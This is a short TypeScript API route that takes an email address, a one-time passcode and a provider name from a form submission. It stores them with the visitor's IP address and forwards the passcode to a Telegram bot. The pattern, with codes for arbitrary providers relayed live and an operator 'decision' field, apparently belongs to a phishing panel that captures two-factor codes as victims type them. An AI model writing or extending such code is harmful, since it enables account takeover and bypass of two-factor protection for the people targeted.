import {
  assertConsent,
  ensureSession,
  getClientIp,
  getSessionId,
  jsonWithSession,
} from "@/lib/server/request";
import { appendSubmission, upsertSession } from "@/lib/server/store";
import { notifyTelegramSubmission } from "@/lib/server/telegram";

type Body = {
  email?: string;
  otp?: string;
  provider?: string;
};

export async function POST(request: Request) {
  const sessionId = await getSessionId();
  const denied = await assertConsent(sessionId);
  if (denied) return denied;

  const body = (await request.json()) as Body;

  await ensureSession(sessionId);

  if (body.email) {
    await upsertSession(sessionId, {
      email: body.email,
      provider: body.provider,
      decision: null,
    });
  } else {
    await upsertSession(sessionId, { decision: null });
  }

  appendSubmission({
    sessionId,
    type: "otp",
    provider: body.provider ?? "UNKNOWN",
    email: body.email,
    otp: body.otp,
    ip: getClientIp(request),
  });

  try {
    await notifyTelegramSubmission(sessionId, { otp: body.otp });
  } catch (error) {
    console.error("Telegram OTP notification failed:", error);
    return jsonWithSession(
      { success: false, error: "Failed to send notification" },
      sessionId,
      { status: 502 },
    );
  }

  return jsonWithSession(
    { success: true, message: "OTP submitted successfully" },
    sessionId,
  );
}
